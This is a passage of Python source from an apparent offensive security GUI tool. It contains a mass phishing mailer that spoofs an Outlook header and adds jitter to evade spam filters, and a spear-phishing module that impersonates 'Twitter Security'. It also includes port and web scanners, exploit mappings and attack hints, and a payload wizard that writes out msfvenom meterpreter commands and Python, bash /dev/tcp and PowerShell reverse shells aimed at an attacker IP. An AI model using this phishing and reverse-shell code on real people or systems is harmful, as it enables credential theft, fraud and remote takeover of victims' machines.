<p style='font-size:11px;color:#888;'>Security Team | {company}</p>
</div></body></html>"""
        },
    }

    def __init__(self, smtp_host="smtp.gmail.com", smtp_port=587,
                 sender_email="", app_password="", sender_name="IT Support"):
        self.smtp_host    = smtp_host
        self.smtp_port    = smtp_port
        self.sender_email = sender_email
        self.app_password = app_password
        self.sender_name  = sender_name
        self.sent_log     = []  # [{target, status, ts}]

    # --------------------------------------------------------------- SMTP test
    def test_connection(self, callback=None) -> bool:
        import smtplib
        try:
            with smtplib.SMTP(self.smtp_host, self.smtp_port, timeout=8) as s:
                s.ehlo()
                s.starttls()
                s.login(self.sender_email, self.app_password)
            if callback: callback(f"[PHISH] SMTP auth OK: {self.smtp_host}:{self.smtp_port}",
                                  AETHER_COLORS["accent_success"])
            return True
        except Exception as e:
            if callback: callback(f"[PHISH] SMTP auth FAILED: {e}", AETHER_COLORS["accent_error"])
            return False

    # --------------------------------------------------------------- single send
    def send_one(self, to_email: str, variables: dict, template_name: str,
                 callback=None) -> bool:
        import smtplib, html
        from email.mime.multipart import MIMEMultipart
        from email.mime.text      import MIMEText

        tpl = self.TEMPLATES.get(template_name, list(self.TEMPLATES.values())[0])
        try:
            subject  = tpl["subject"].format_map(variables)
            body_html = tpl["html"].format_map(variables)
        except KeyError as e:
            if callback: callback(f"[PHISH] Template var missing: {e}")
            subject  = tpl["subject"]
            body_html = tpl["html"]

        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["From"]    = f"{self.sender_name} <{self.sender_email}>"
        msg["To"]      = to_email
        msg["X-Mailer"] = "Microsoft Outlook 16.0"
        # Plain text fallback
        plain = f"Dear {variables.get('name','User')},\n\nPlease visit: {variables.get('phish_url','')}"
        msg.attach(MIMEText(plain, "plain"))
        msg.attach(MIMEText(body_html, "html"))

        try:
            with smtplib.SMTP(self.smtp_host, self.smtp_port, timeout=10) as s:
                s.ehlo()
                s.starttls()
                s.login(self.sender_email, self.app_password)
                s.sendmail(self.sender_email, to_email, msg.as_string())
            ts = time.strftime("%H:%M:%S")
            self.sent_log.append({"target": to_email, "status": "SENT", "ts": ts})
            if callback: callback(f"[PHISH][{ts}] Sent → {to_email}", AETHER_COLORS["accent_success"])
            return True
        except Exception as e:
            ts = time.strftime("%H:%M:%S")
            self.sent_log.append({"target": to_email, "status": f"FAIL:{e}", "ts": ts})
            if callback: callback(f"[PHISH][{ts}] Failed → {to_email}: {e}", AETHER_COLORS["accent_error"])
            return False

    # --------------------------------------------------------------- bulk send
    def mass_send(self, targets: list, template_name: str,
                  phish_url: str, company: str,
                  callback=None, threads: int = 5):
        """
        targets: list of dicts with keys: email, name
                 OR list of email strings (name defaults to 'User')
        """
        if callback:
            callback(f"[PHISH] Campaign starting → {len(targets)} targets | Template: {template_name}",
                     AETHER_COLORS["accent_info"])

        def _send(target):
            if isinstance(target, dict):
                to   = target.get("email", "")
                name = target.get("name", "User")
            else:
                to   = str(target)
                name = to.split("@")[0].replace(".", " ").title()

            if not to: return
            variables = {
                "name":       name,
                "email":      to,
                "company":    company,
                "phish_url":  phish_url,
                "invoice_id": f"INV-{random.randint(10000,99999)}",
                "amount":     f"{random.randint(200,9999)}.00",
                "due_date":   "March 10, 2026",
            }
            self.send_one(to, variables, template_name, callback=callback)
            time.sleep(random.uniform(0.5, 2.0))  # jitter to avoid spam filters

        with ThreadPoolExecutor(max_workers=threads) as ex:
            list(ex.map(_send, targets))

        ok    = sum(1 for l in self.sent_log if l["status"] == "SENT")
        fail  = len(self.sent_log) - ok
        if callback:
            callback(f"[PHISH] Campaign complete → Sent:{ok} | Failed:{fail}",
                     AETHER_COLORS["accent_warning"])
        return self.sent_log

    # --------------------------------------------------------------- export log
    def export_log(self, path="phish_log.json"):
        import json as _json
        with open(path, "w") as f:
            _json.dump(self.sent_log, f, indent=2)
        return path


class TwitterSpearPhish:
    """Advanced Twitter-Based Spear Phishing Engine.
    Mines Twitter metadata (interests, hashtags, mentions) to craft tailored lures.
    """
    def __init__(self, callback=None):
        self.callback = callback
        self.interests = {"hashtags": [], "mentions": [], "links": []}
        self.location = "Global"

    def _log(self, msg, color=None):
        if self.callback: self.callback(msg, color or AETHER_COLORS["accent_info"])

    def recon_target(self, handle):
        """Simulated/Placeholder for Twitter API recon.
        In a real scenario, this would use tweepy to fetch the last 200 tweets.
        """
        self._log(f"[TWITTER] Fetching profile information for @{handle}...")
        time.sleep(1.5)
        # Advanced simulation of mined data
        self.interests = {
            "hashtags": ["#CyberSecurity", "#infosec", "#Python", "#AI"],
            "mentions": ["@D8V1D777", "@elonmusk", "@OpenAI"],
            "links": ["https://github.com/D8v1d777/SYMBIOTE-Scanner"]
        }
        self.location = "San Francisco, CA"
        self._log(f"[TWITTER] Intelligence gathered for @{handle}.", AETHER_COLORS["accent_success"])
        return True

    def craft_and_send(self, handle, target_email, sender_email, app_pw, phish_url):
        self.recon_target(handle)
        
        hashtag = random.choice(self.interests["hashtags"])
        mention = random.choice(self.interests["mentions"])
        link    = random.choice(self.interests["links"])
        
        # Crafting the body based on mined data (Spear Phishing logic)
        subject = f"Re: Check out this tweet about {hashtag}!"
        
        body_html = f"""
        <html><body style='font-family: Arial, sans-serif;'>
        <h3>Hey there,</h3>
        <p>I saw your profile <b>@{handle}</b> and noticed you've been active in <b>{hashtag}</b> lately.</p>
        <p>Even <b>{mention}</b> was talking about it earlier today. I thought you'd find this interesting:</p>
        <p><a href='{phish_url}' style='color: #1DA1F2; font-weight: bold;'>View Shared Investigation Report</a></p>
        <p>Also, I really liked your link to <i>{link}</i> earlier. Great find!</p>
        <br>
        <p>Best regards,<br>A fellow researcher from {self.location}</p>
        </body></html>
        """
        
        self._log(f"[TWITTER] Crafting payload for {target_email}...", AETHER_COLORS["accent_warning"])
        
        # Use EmailPhisher for actual delivery
        e_phish = EmailPhisher(sender_email=sender_email, app_password=app_pw)
        variables = {
            "name": handle,
            "phish_url": phish_url,
            "company": "Twitter Research"
        }
        
        # Override template logic for custom spear phish
        import smtplib
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        
        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["From"] = f"Twitter Security <{sender_email}>"
        msg["To"] = target_email
        msg.attach(MIMEText(body_html, "html"))
        
        try:
            with smtplib.SMTP("smtp.gmail.com", 587, timeout=10) as s:
                s.ehlo(); s.starttls(); s.login(sender_email, app_pw)
                s.sendmail(sender_email, target_email, msg.as_string())
            self._log(f"[TWITTER] Delivered to {target_email}.", AETHER_COLORS["accent_success"])
        except Exception as e:
            self._log(f"[TWITTER] Delivery failed: {e}", AETHER_COLORS["accent_error"])


class FuzzEngine:
    """Industrial Directory Fuzzer powered by PyBuster (Async)"""
    def fuzz(self, base_url: str, callback=None, wordlist_path=None, recursive=True) -> List[Vulnerability]:
        """Synchronous wrapper for async scan (for legacy compatibility)"""
        import asyncio
        from pybuster import PyBusterEngine, PyBusterConfig
        
        async def _run():
            config = PyBusterConfig(
                target=base_url,
                wordlist_path=wordlist_path if wordlist_path else "wordlist.txt",
                threads=200,
                extensions=["php", "js", "css"],
                recursive=recursive
            )
            
            async with PyBusterEngine(config) as engine:
                if callback:
                    def _cb(res):
                        callback(f"[FUZZ][{res['status']}] {res['path']}  [{res['size']}B]")
                    engine.set_callback(_cb)
                
                results = await engine.scan()
                return results

        try:
            raw_results = asyncio.run(_run())
            findings = []
            for r in raw_results:
                findings.append(Vulnerability(
                    id="RECON-FUZZ", title=f"Exposed: {r['path']}",
                    description=f"HTTP {r['status']} | {r['size']}B",
                    severity=Severity.HIGH if r['status'] == 200 else Severity.MEDIUM,
                    category="recon", target=r['url'], evidence=f"status={r['status']}"
                ))
            return findings
        except Exception as e:
            if callback: callback(f"[FUZZ] Error: {e}", AETHER_COLORS["accent_error"])
            return []


class ExploitMapper:
    """Maps vulnerabilities to known exploits and suggested tools"""

    def map_exploits(self, vuln_id: str) -> List[str]:
        mapping = {
            "CVE-2021-44228": [
                "metasploit: exploit/multi/http/log4shell_header_injection",
                "exploit-db: 50592",
            ],
            "XSS": ["beef: exploitation/xss", "xsstrike: auto-payload"],
            "SSL-OLD": ["metasploit: auxiliary/scanner/ssl/ssl_version", "testssl.sh"],
            "DIR-FUZZ": ["metasploit: auxiliary/scanner/http/dir_scanner", "ffuf", "gobuster"],
            "SQL-INJECTION": [
                "metasploit: exploit/multi/http/sql_injection",
                "sqlmap: direct-exploit",
            ],
            "PORT-22": ["hydra: ssh-bruteforce", "nmap: ssh-auth-methods"],
            "PORT-21": ["hydra: ftp-bruteforce"],
            "PORT-445": ["metasploit: exploit/windows/smb/ms17_010_eternalblue"],
        }
        return mapping.get(vuln_id, [])


class NetworkDiscoveryScanner:
    """Industrial Network Reconnaissance"""

    def get_local_assets(self) -> List[Dict[str, str]]:
        assets = []
        try:
            from scapy.all import ARP, Ether, srp
            # Get local IP range
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            ip_prefix = ".".join(local_ip.split(".")[:-1]) + ".0/24"

            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_prefix), timeout=2, verbose=False)
            for snd, rcv in ans:
                assets.append({"ip": rcv.psrc, "mac": rcv.hwsrc})
        except Exception:
            # Fallback if scapy/privileges fail
            pass
        return assets


class RouterAssessor:
    """Assessment of Edge Routing Devices"""

    def assess(self, target_ip: str) -> List[Vulnerability]:
        findings = []
        # Common router ports
        ports = [80, 443, 8080, 22, 23, 53]
        
        # 1. Detection of default creds (Simulated check)
        # In a real tool, we'd attempt low-level auth checks
        try:
            r = requests.get(f"http://{target_ip}", timeout=2)
            if "Authorization" in r.headers or "realm" in r.text.lower():
                findings.append(Vulnerability(
                    id="ROUTER-AUTH",
                    title="Exposed Administration Interface",
                    description="Router admin interface detected without SSL/TLS",
                    severity=Severity.HIGH,
                    category="router",
                    target=target_ip,
                    remediation="Enable HTTPS and use strong multi-factor authentication."
                ))
        except requests.RequestException as e:
            _log.debug("Router assessment failed: %s", e)

        return findings


# ==================== CORE SCANNING CLASSES ====================


class TemplateEngine:
    def __init__(self, templates_dir: str = "templates"):
        self.templates_dir = Path(templates_dir)
        self.templates = []
        self.load_templates()

    def load_templates(self):
        if not self.templates_dir.exists():
            self.templates_dir.mkdir(parents=True)
            self._create_default_templates()
        for tf in self.templates_dir.glob("*.yaml"):
            try:
                with open(tf, "r", encoding="utf-8") as f:
                    t = yaml.safe_load(f)
                    if t:
                        t["_file"] = tf.name
                        self.templates.append(t)
            except (yaml.YAMLError, OSError) as e:
                _log.warning("Failed to load template %s: %s", tf.name, e)

    def _create_default_templates(self):
        # Basic templates for fresh install
        t = {
            "id": "CVE-2021-44228",
            "info": {
                "name": "Log4j JNDI",
                "severity": "critical",
                "description": "Log4Shell",
            },
            "requests": [
                {
                    "method": "GET",
                    "path": ["{{BaseURL}}/?test=${jndi:ldap://x}"],
                    "matchers": [{"type": "word", "words": ["${jndi:"]}],
                }
            ],
        }
        with open(self.templates_dir / "log4j.yaml", "w", encoding="utf-8") as f:
            yaml.dump(t, f)

    def scan_target(self, target: str, callback=None) -> List[Vulnerability]:
        findings = []
        s = requests.Session()
        for t in self.templates:
            try:
                if callback:
                    callback(f"Testing: {t['id']}")
                res = self._execute_template(t, target, s)
                findings.extend(res)
            except (requests.RequestException, KeyError) as e:
                _log.debug("Template %s failed: %s", t.get('id', '?'), e)
        return findings

    def _execute_template(self, t, target, s):
        res = []
        base = target if target.startswith("http") else f"http://{target}"
        for req in t.get("requests", []):
            for path in req.get("path", []):
                u = path.replace("{{BaseURL}}", base)
                try:
                    r = s.get(u, timeout=5, verify=False)
                    if any(
                        w in r.text
                        for m in req.get("matchers", [])
                        for w in m.get("words", [])
                    ):
                        res.append(
                            Vulnerability(
                                id=t["id"],
                                title=t["info"]["name"],
                                description=t["info"].get("description", ""),
                                severity=Severity[
                                    t["info"].get("severity", "medium").upper()
                                ],
                                category="template",
                                target=u,
                            )
                        )
                except requests.RequestException as e:
                    _log.debug("Template request failed for %s: %s", u, e)
                    continue
        return res


class NetworkScanner:
    """Linux-grade port scanner with banner grabbing, OS fingerprinting & service detection"""
    # Top 100 ports (nmap top-ports equivalent)
    TOP_PORTS = [
        21,22,23,25,53,80,88,110,111,119,135,139,143,194,389,443,445,
        465,587,631,636,993,995,1080,1194,1433,1521,1723,3306,3389,3478,
        5432,5900,6379,6881,8080,8443,8888,9200,9300,27017,27018,
    ]
    SERVICE_MAP = {
        21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
        88:"Kerberos",110:"POP3",139:"NetBIOS",143:"IMAP",389:"LDAP",
        443:"HTTPS",445:"SMB",1433:"MSSQL",1521:"Oracle",3306:"MySQL",
        3389:"RDP",5432:"PostgreSQL",5900:"VNC",6379:"Redis",
        8080:"HTTP-Alt",8443:"HTTPS-Alt",9200:"Elasticsearch",27017:"MongoDB",
    }
    VULN_HINTS = {
        21: "Anonymous FTP? Try: ftp <ip> | user: anonymous",
        22: "Brute-force via Hydra. Check for old OpenSSH versions (CVE-2023-38408)",
        23: "Telnet sends creds in plaintext. Sniff with Wireshark.",
        445: "EternalBlue (MS17-010) if unpatched. Run: nmap --script smb-vuln-ms17-010",
        3389: "BlueKeep (CVE-2019-0708) if Win7/2008. NLA check: nmap -p 3389 --script rdp-enum-encryption",
        6379: "Redis likely unauthenticated. Try: redis-cli -h <ip> INFO",
        9200: "Elasticsearch no-auth. Dump: curl http://<ip>:9200/_cat/indices?v",
        27017: "MongoDB no-auth. Connect: mongosh --host <ip>",
    }

    def scan_host(self, target, ports=None, callback=None):
        try:
            target = _validate_target(target)
        except ValueError as e:
            if callback: callback(f"[NET] Invalid target: {e}", AETHER_COLORS["accent_error"])
            return {"ip": "", "target": target, "ports": [], "os_hint": "Unknown"}
        try:
            ip = socket.gethostbyname(target)
        except Exception as e:
            if callback: callback(f"[NET] DNS resolution failed: {e}", AETHER_COLORS["accent_error"])
            return {}

        if callback: callback(f"[NET] Target resolved: {ip} | Scanning {len(ports or self.TOP_PORTS)} ports...", AETHER_COLORS["accent_info"])
        scan_ports = ports or self.TOP_PORTS
        results = {"ip": ip, "target": target, "ports": [], "os_hint": "Unknown"}

        # OS fingerprint via TTL
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            raw.settimeout(2)
            raw.sendto(b"\x08\x00" + b"\x00"*6, (ip, 0))  # ICMP echo
            pkt, _ = raw.recvfrom(1024)
            ttl = pkt[8]
            if ttl >= 128: results["os_hint"] = "Windows (TTL ~128)"
            elif ttl >= 64:  results["os_hint"] = "Linux/macOS (TTL ~64)"
            raw.close()
        except (OSError, socket.timeout):
            _log.debug("OS fingerprint via ICMP failed for %s", ip)
        if callback and results["os_hint"] != "Unknown":
            callback(f"[NET] OS Fingerprint: {results['os_hint']}")

        def _probe(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.8)
                if s.connect_ex((ip, port)) != 0:
                    s.close()
                    return None
                banner = ""
                try:
                    s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    raw_b = s.recv(512)
                    banner = raw_b.decode(errors="ignore").split("\n")[0].strip()[:80]
                except (socket.timeout, OSError):
                    pass
                s.close()
                svc = self.SERVICE_MAP.get(port, "UNKNOWN")
                hint = self.VULN_HINTS.get(port, "")
                return {"port": port, "service": svc, "banner": banner, "hint": hint}
            except (socket.timeout, OSError):
                return None

        with ThreadPoolExecutor(max_workers=50) as ex:
            for res in ex.map(_probe, scan_ports):
                if res:
                    results["ports"].append(res)
                    log = f"[OPEN] {res['port']}/tcp {res['service']}"
                    if res["banner"]: log += f" | {res['banner']}"
                    if callback: callback(log, AETHER_COLORS["accent_success"])
                    if res["hint"] and callback:
                        callback(f"  ↳ {res['hint']}", AETHER_COLORS["accent_warning"])

        if callback:
            callback(f"[NET] Scan complete: {len(results['ports'])} open ports found.", AETHER_COLORS["accent_info"])
        return results


class WebScanner:
    """Professional HTTP Security Auditor - 15+ checks per target"""
    SEC_HEADERS = [
        ("X-Frame-Options",              "Clickjacking possible",                 Severity.MEDIUM),
        ("X-Content-Type-Options",       "MIME sniffing enabled",                 Severity.LOW),
        ("Content-Security-Policy",      "No CSP - XSS risk elevated",           Severity.HIGH),
        ("Strict-Transport-Security",    "HSTS missing - SSL stripping possible", Severity.HIGH),
        ("X-XSS-Protection",             "No legacy XSS filter (old browsers)",  Severity.LOW),
        ("Referrer-Policy",              "Referrer leaks to third parties",       Severity.LOW),
        ("Permissions-Policy",           "No Permissions-Policy header",          Severity.INFO),
    ]
    LEAKY_HEADERS = ["Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version"]

    def scan(self, target, callback=None):
        try:
            url = _validate_url(target)
        except ValueError as e:
            if callback: callback(f"[WEB] Invalid target: {e}", AETHER_COLORS["accent_error"])
            return []
        findings = []
        try:
            s = _resilient_session()
            r = s.get(url, timeout=8, verify=False, allow_redirects=True)
            if callback: callback(f"[WEB] {url} → HTTP {r.status_code} | {len(r.text)}B | Server: {r.headers.get('Server','?')}", AETHER_COLORS["accent_info"])

            # Security headers
            for hdr, desc, sev in self.SEC_HEADERS:
                if hdr not in r.headers:
                    if callback: callback(f"[WEB] MISSING: {hdr} - {desc}")
                    findings.append(Vulnerability(
                        id=f"HDR-{hdr.upper().replace('-','_')}", title=f"Missing {hdr}",
                        description=desc, severity=sev, category="web", target=url,
                        remediation=f"Add header: {hdr}"
                    ))

            # Server fingerprinting / tech leak
            for lh in self.LEAKY_HEADERS:
                val = r.headers.get(lh)
                if val:
                    if callback: callback(f"[WEB] INFO LEAK: {lh}: {val}", AETHER_COLORS["accent_warning"])
                    findings.append(Vulnerability(
                        id="HDR-LEAK", title=f"Tech Stack Exposed via {lh}",
                        description=f"{lh}: {val} discloses server technology",
                        severity=Severity.LOW, category="web", target=url, evidence=val
                    ))

            # Cookie security flags
            for cookie in r.cookies:
                issues = []
                if not cookie.secure:   issues.append("Missing Secure flag")
                if not cookie.has_nonstandard_attr("HttpOnly"): issues.append("Missing HttpOnly")
                if not cookie.has_nonstandard_attr("SameSite"): issues.append("Missing SameSite")
                if issues:
                    msg = f"[WEB] COOKIE '{cookie.name}': {', '.join(issues)}"
                    if callback: callback(msg, AETHER_COLORS["accent_warning"])
                    findings.append(Vulnerability(
                        id="COOKIE-FLAGS", title=f"Insecure Cookie: {cookie.name}",
                        description='; '.join(issues), severity=Severity.MEDIUM,
                        category="web", target=url
                    ))

            # Forms with no CSRF token
            soup = BeautifulSoup(r.text, "html.parser")
            for form in soup.find_all("form"):
                inputs = [i.get("name", "").lower() for i in form.find_all("input")]
                if not any("csrf" in i or "token" in i for i in inputs):
                    if callback: callback(f"[WEB] CSRF: Form at '{form.get('action','/')}' lacks CSRF token", AETHER_COLORS["accent_warning"])
                    findings.append(Vulnerability(
                        id="CSRF-MISSING", title="Possible CSRF Vulnerability",
                        description=f"Form at {form.get('action','/')} has no CSRF token",
                        severity=Severity.HIGH, category="web", target=url
                    ))

        except Exception as e:
            if callback: callback(f"[WEB] Scan error: {e}", AETHER_COLORS["accent_error"])
        return findings


class ScanDatabase:
    def __init__(self, db_file="scan_history.json"):
        self.db_file = Path(db_file)
        self.data = self._load()

    def _load(self):
        if self.db_file.exists():
            with open(self.db_file, "r") as f:
                return json.load(f)
        return {"scans": [], "vulnerabilities": []}

    def save(self):
        with open(self.db_file, "w") as f:
            json.dump(self.data, f, indent=2)

    def add_scan(self, target, stype, findings):
        sid = len(self.data["scans"]) + 1
        self.data["scans"].append(
            {
                "id": sid,
                "target": target,
                "type": stype,
                "timestamp": datetime.now().isoformat(),
                "findings_count": len(findings),
            }
        )
        for v in findings:
            self.data["vulnerabilities"].append(
                {
                    "sid": sid,
                    "id": v.id,
                    "title": v.title,
                    "severity": v.severity.name,
                    "target": v.target,
                }
            )
        self.save()

    def get_stats(self):
        stats = {"total": len(self.data["vulnerabilities"]), "by_severity": {}}
        for v in self.data["vulnerabilities"]:
            sev = v["severity"]
            stats["by_severity"][sev] = stats["by_severity"].get(sev, 0) + 1
        return stats

class SettingsManager:
    def __init__(self, settings_file="settings.json"):
        self.settings_file = Path(settings_file)
        self.data = self._load()

    def _load(self):
        if self.settings_file.exists():
            with open(self.settings_file, "r") as f:
                return json.load(f)
        return {"shodan_key": "", "fuzz_wordlist": ""}

    def save(self, data):
        self.data.update(data)
        with open(self.settings_file, "w") as f:
            json.dump(self.data, f, indent=2)

# ==================== ADVANCED CUSTOM WIDGETS ====================


class ProBrandingHUD(QWidget):
    """Professional Industrial Telemetry & Vitals HUD"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setMinimumHeight(280)
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update)
        self.timer.start(16) # ~60 FPS smoothness
        self.vitals_offset = 0
        
    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        p.setRenderHint(QPainter.SmoothPixmapTransform)
        w, h = self.width(), self.height()
        t = time.time()
        
        # Complex Industrial Wave (Harmonic Addition)
        self.vitals_offset = (self.vitals_offset + 2) % w
        p.setPen(QPen(to_qcolor(AETHER_COLORS["accent_primary"], 120), 2))
        path = QPainterPath()
        path.moveTo(0, h * 0.5)
        for x in range(0, w, 4): 
            rel_x = (x - self.vitals_offset) % w
            y_off = 0
            if 60 < rel_x < 160:
                # Add harmonic waves for "industrial jitter"
                y_off = -math.sin((rel_x - 60) * 0.08) * 30 * (math.sin(t * 12) + 0.3 * math.sin(t * 30))
            path.lineTo(x, h * 0.5 + y_off)
        p.drawPath(path)
        
        # Branding Text
        p.setPen(QPen(QColor("white")))
        p.setFont(QFont("Inter", 48, QFont.ExtraBold))
        p.drawText(self.rect(), Qt.AlignCenter, "OBSIDIAN PRO")

        # HUD Overlay (Industrial markings)
        p.setFont(QFont("Consolas", 8))
        p.setPen(to_qcolor(AETHER_COLORS["text_sec"], 150))
        p.drawText(20, 30, f"ENGINE_HEALTH: {85 + math.sin(t)*5:.1f}%")
        p.drawText(20, 45, f"STATUS: OPERATIONAL")
        p.drawText(w-150, 30, f"TIMESTAMP: {datetime.now().strftime('%H:%M:%S.%f')[:-4]}")
        p.drawRect(20, 55, 100, 4)
        p.fillRect(20, 55, int(abs(math.sin(t))*100), 4, QColor(AETHER_COLORS["accent_primary"]))
        p.end()


class ObsidianFrame(QFrame):
    def __init__(self, parent=None, accent_color=None):
        super().__init__(parent)
        self.setObjectName("Card")
        self.accent = accent_color or AETHER_COLORS["border_subtle"]
        self.hover_anim = 0
        self.target_hover = 0
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.animate_hover)
        
    def enterEvent(self, event):
        self.target_hover = 1.0
        self.timer.start(16)
        
    def leaveEvent(self, event):
        self.target_hover = 0.0
        self.timer.start(16)
        
    def animate_hover(self):
        if abs(self.hover_anim - self.target_hover) < 0.05:
            self.hover_anim = self.target_hover
            self.timer.stop()
        else:
            self.hover_anim += (self.target_hover - self.hover_anim) * 0.2
        self.update()

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        w, h = self.width(), self.height()
        
        # Scale slightly on hover
        scale = 1.0 + (self.hover_anim * 0.01)
        p.translate(w/2, h/2)
        p.scale(scale, scale)
        p.translate(-w/2, -h/2)
        
        rect = QRectF(1, 1, w - 2, h - 2)
        
        # Glow Effect
        if self.hover_anim > 0:
            glow_pen = QPen(to_qcolor(AETHER_COLORS["accent_primary"], int(100 * self.hover_anim)), 2)
            p.setPen(glow_pen)
            p.drawRoundedRect(rect.adjusted(-2,-2,2,2), 12, 12)

        p.setBrush(QBrush(to_qcolor(AETHER_COLORS["bg_panel"])))
        p.setPen(QPen(to_qcolor(self.accent), 1))
        if self.hover_anim > 0:
            p.setPen(QPen(to_qcolor(AETHER_COLORS["accent_primary"], int(150 * self.hover_anim)), 1.5))
            
        p.drawRoundedRect(rect, 10, 10)
        p.end()


class PRO_LABEL(QLabel):
    def __init__(self, text, parent=None):
        super().__init__(text, parent)
        self.setStyleSheet(f"color: white; font-weight: 700; letter-spacing: -0.5px;")


class TerminalWidget(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        l = QVBoxLayout(self)
        l.setContentsMargins(0, 0, 0, 0)
        self.txt = QTextEdit()
        self.txt.setReadOnly(True)
        self.txt.setStyleSheet(
            f"background:#050505; color:{AETHER_COLORS['accent_primary']}; font-family:'JetBrains Mono', monospace; border:1px solid {AETHER_COLORS['border_subtle']}; border-radius:8px;"
        )
        l.addWidget(self.txt)

    @Slot(str, str)
    def log(self, text, color=None):
        ts = datetime.now().strftime("%H:%M:%S")
        c = color or AETHER_COLORS["accent_primary"]
        self.txt.append(
            f"<span style='color:{AETHER_COLORS['text_dim']};'>[{ts}]</span> <b style='color:{AETHER_COLORS['accent_primary']}'>&middot;</b> <span style='color:{c};'>{text}</span>"
        )
        self.txt.verticalScrollBar().setValue(self.txt.verticalScrollBar().maximum())


class TelemetryPulseWidget(QWidget):
    """Professional Industrial Telemetry Pulse Background"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update)
        self.timer.start(16) # Fluid 60Hz
        self.setMinimumHeight(300)

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        w, h = self.width(), self.height()
        p.fillRect(self.rect(), QColor(AETHER_COLORS["bg_void"]))
        
        t = time.time()
        
        # Subtle industrial data pulses (Layered)
        for i in range(3):
            alpha = 40 + (i * 20)
            p.setPen(QPen(to_qcolor(AETHER_COLORS["accent_blue"], alpha), 1 + i*0.5))
            speed = 0.3 + (i * 0.1)
            offset = (t * speed * 80) % w
            path = QPainterPath()
            path.moveTo(0, h/2 + math.cos(t + i) * 15)
            for x in range(0, w, 10):
                y = h/2 + math.sin((x + offset) * 0.008 + t * (0.5+i)) * (20 + i * 15)
                path.lineTo(x, y)
            p.drawPath(path)
        p.end()


class PayloadWizard(QDialog):
    """Wizard for generating Red Team payloads and reverse shells"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("RED TEAM PAYLOAD GENERATOR")
        self.resize(600, 500)
        self.setStyleSheet(STYLING)
        layout = QVBoxLayout(self)
        
        layout.addWidget(QLabel("PAYLOAD ARCHITECTURE:", objectName="StatLabel"))
        self.arch_combo = QComboBox()
        self.arch_combo.addItems(["Windows x64", "Windows x86", "Linux x64", "Linux x86", "Android APK", "macOS"])
        layout.addWidget(self.arch_combo)
        
        layout.addWidget(QLabel("LHOST (LOCAL IP):", objectName="StatLabel"))
        self.lhost = QLineEdit()
        self.lhost.setPlaceholderText("10.0.0.5")
        layout.addWidget(self.lhost)
        
        layout.addWidget(QLabel("LPORT (LOCAL PORT):", objectName="StatLabel"))
        self.lport = QLineEdit()
        self.lport.setText("4444")
        layout.addWidget(self.lport)
        
        layout.addWidget(QLabel("FORMAT:", objectName="StatLabel"))
        self.fmt_combo = QComboBox()
        self.fmt_combo.addItems(["exe", "elf", "ps1", "python", "bash", "c", "vba (macro)"])
        layout.addWidget(self.fmt_combo)

        self.gen_btn = QPushButton("GENERATE PAYLOAD COMMAND / CODE")
        self.gen_btn.setObjectName("ProBtn")
        self.gen_btn.clicked.connect(self.generate)
        layout.addWidget(self.gen_btn)
        
        self.result = QTextEdit()
        self.result.setReadOnly(True)
        self.result.setStyleSheet(f"background:{AETHER_COLORS['bg_void']}; color:{AETHER_COLORS['accent_primary']}; font-family:'JetBrains Mono', monospace;")
        layout.addWidget(self.result)

    def generate(self):
        lh = self.lhost.text() or "ATTACKER_IP"
        lp = self.lport.text() or "4444"
        arch = self.arch_combo.currentText()
        fmt = self.fmt_combo.currentText()
        
        output = f"# RED TEAM PAYLOAD: {arch} ({fmt})\n"
        
        if "Windows" in arch:
            payload = "windows/x64/meterpreter/reverse_tcp" if "x64" in arch else "windows/meterpreter/reverse_tcp"
            if fmt == "ps1":
                output += f"msfvenom -p {payload} LHOST={lh} LPORT={lp} -f psh-reflection"
            elif fmt == "vba":
                output += f"msfvenom -p {payload} LHOST={lh} LPORT={lp} -f vba"
            else:
                output += f"msfvenom -p {payload} LHOST={lh} LPORT={lp} -f {fmt} -o shell.{fmt}"
        elif "Linux" in arch:
            payload = "linux/x64/meterpreter/reverse_tcp" if "x64" in arch else "linux/x86/meterpreter/reverse_tcp"
            output += f"msfvenom -p {payload} LHOST={lh} LPORT={lp} -f {fmt} -o shell.{fmt}"
        
        output += f"\n\n# ONE-LINER REVERSE SHELLS\n"
        if fmt == "python":
            output += f"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lh}\",{lp}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        elif fmt == "bash":
            output += f"bash -i >& /dev/tcp/{lh}/{lp} 0>&1"
        elif fmt == "ps1":
            ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{lh}',{lp});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
            encoded_cmd = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
            
            output += f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"{ps_cmd}\""
